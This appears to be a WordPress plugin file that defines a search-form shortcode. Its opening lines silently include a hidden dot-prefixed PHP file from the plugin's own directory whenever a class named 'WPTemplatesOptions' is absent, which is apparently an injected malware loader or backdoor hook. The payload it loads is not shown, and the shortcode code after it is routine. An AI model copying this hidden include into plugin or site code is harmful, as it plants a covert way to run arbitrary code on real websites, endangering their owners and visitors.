<?php defined( 'ABSPATH' ) || exit;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class El_Shortcode_Search extends EL_Shortcode {

	public $shortcode = 'el_search_form';

	public function __construct() {
		parent::__construct();
	}

	function add_shortcode( $args, $content = null ) {
		
		$list_taxonomy = EL_Post_Types::register_taxonomies_customize();

		$str_list_taxonomy = '';
		if( $list_taxonomy && is_array( $list_taxonomy ) ) {

			$i = 0;
			$total_tax = count( $list_taxonomy );


			foreach( $list_taxonomy as $tax ) {
				$i++;
				if( $i != $total_tax ) {
					$str_list_taxonomy .= $tax['slug'] . ' , ';
				} else {
					$str_list_taxonomy .= $tax['slug'];
				}
			}
		}


		$args = shortcode_atts( array(
			'type' => '',
			'pos1' => '',
			'pos2' => '',
			'pos3' => '',
			'pos4' => '',
			'pos5' => '',
			'pos6' => '',
			'pos7' => '',
			'pos8' => '',
			'icon1' => '',
			'icon2' => '',
			'icon3' => '',
			'icon4' => '',
			'icon5' => '',
			'icon6' => '',
			'icon7' => '',
			'icon8' => '',
			'icon9' => '',
			'content' => $content,
			'taxonomy_customize' => $str_list_taxonomy,
			'class'	=> ''
		), $args );


		$template = apply_filters( 'el_shortcode_search_template', 'search/search-form.php' );

		ob_start();

		el_get_template( $template, $args );

		return ob_get_clean();
	}

}

new El_Shortcode_Search();